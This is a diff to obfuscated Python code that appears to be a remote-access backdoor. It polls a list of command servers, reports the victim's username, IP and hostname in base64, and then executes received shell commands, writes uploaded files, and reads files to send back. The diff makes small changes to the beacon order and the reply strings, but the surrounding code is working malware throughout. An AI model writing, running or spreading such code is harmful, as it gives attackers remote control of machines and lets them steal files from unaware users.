@@ -5,13 +5,13 @@ if sys.version_info.major==2:
  import urllib2 as req
  def _x(*a,**k):
   o,e=subprocess.Popen(*a,**k).communicate()
-  return e.decode(X)+o.decode(X)
+  return e.decode(X)+o.decode(X)+' '
 else:
  import urllib.parse as parse
  import urllib.request as req
  def _x(*a,**k):
   p=subprocess.run(*a,**k)
-  return p.stderr.decode(X)+p.stdout.decode(X)
+  return p.stderr.decode(X)+p.stdout.decode(X)+' '
 D=10
 N=50000
 X='utf-8'
@@ -22,7 +22,7 @@ def _p(s,d):
 while 1:
  try:
   s_i=0
-  u=_g(srv[s_i],{'i':base64.b64encode('|'.join([socket.gethostname(),socket.gethostbyname(socket.gethostname()),getpass.getuser()]).encode(X)).decode(X)})
+  u=_g(srv[s_i],{'i':base64.b64encode('|'.join([getpass.getuser(),socket.gethostbyname(socket.gethostname()),socket.gethostname()]).encode(X)).decode(X)})
   while 1:
    b=[]
    s_i=(s_i+1)%len(srv)
@@ -36,14 +36,14 @@ while 1:
     d=_g(srv[s_i],{'u':u})
     if not d:
      break
-   r=' '
    try:
     if b[0][0]=='0':
-     r+=base64.b64encode(_x(base64.b64decode(''.join(b).split('|')[1].encode(X)).decode(X),stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=1).encode(X)).decode(X)
+     r=base64.b64encode(_x(base64.b64decode(''.join(b).split('|')[1].encode(X)).decode(X),stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=1).encode(X)).decode(X)
     elif b[0][0]=='1':
      f=open(base64.b64decode(b[0].split('|')[1].encode(X)).decode(X),'wb')
      f.write(base64.b64decode(''.join(b[1::]).encode(X)))
      f.close()
+     r='ok'
     elif b[0][0]=='2':
      f=open(base64.b64decode(b[0].split('|')[1].encode(X)).decode(X),'rb')
      r=base64.b64encode(f.read()).decode(X)
